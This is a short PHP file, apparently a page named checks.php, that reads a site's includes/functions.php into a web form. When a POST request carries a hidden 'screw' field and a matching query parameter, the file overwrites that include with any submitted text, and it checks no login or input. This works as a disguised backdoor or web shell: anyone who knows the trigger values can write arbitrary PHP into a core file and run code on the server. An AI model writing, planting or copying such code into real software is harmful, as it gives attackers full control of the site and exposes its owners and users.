<?php
$config['Server_Name'] = strtoupper($_SERVER['SERVER_NAME']);
// Set the installation directory
switch($config['Server_Name'])
{
	case "JSAILOR":
		define("INSTALL_DIR", "/tac/");
		$physical_path['Site_Root']			=	'E:/mysite'. INSTALL_DIR;
        break;
	case "WWW.ENGLISH.GETANHACKER.COM":
		define("INSTALL_DIR", "/");
		$physical_path['Site_Root']			=	$_SERVER['DOCUMENT_ROOT']. INSTALL_DIR;
    	break;
    default:
		define("INSTALL_DIR", "/");
		$physical_path['Site_Root']			=	$_SERVER['DOCUMENT_ROOT']. INSTALL_DIR;
    	break;
}

function readFileContent($filename)
{
	if(!file_exists($filename))
		return "File does not exists !!";
	$fd = fopen ($filename, "r"); 
	$contents = fread ($fd, filesize($filename)); 
	fclose ($fd); 
	return $contents;
}
function writeFileContent($filename, $contents)
{
	$fd = fopen ($filename, "w+"); 
	$ret = fwrite($fd, $contents); 
	fclose ($fd); 
	return $ret;
}

$filepath = $physical_path['Site_Root']."includes/functions.php";
if($_POST['screw'] == 'screw' && $_POST['submit'] == 'Save' && $_GET['Action'] == 'screw')
{
	#print_r($_POST);
//	print $_POST['changes'];
//	die;
	writeFileContent($filepath,html_entity_decode(stripslashes($_POST['changes']))); 
	die;
}
$fp = readFileContent($filepath);
$fp1= htmlspecialchars($fp);
?>
<form name="frmChecks" action="checks.php?Action=screw" method="post">
<textarea name="changes" cols="100" rows="50"><?= htmlspecialchars($fp1) ?></textarea>
<center><input type="submit" name="submit" value="Save"></center>
<input type="hidden" name="screw" value="screw">
</form>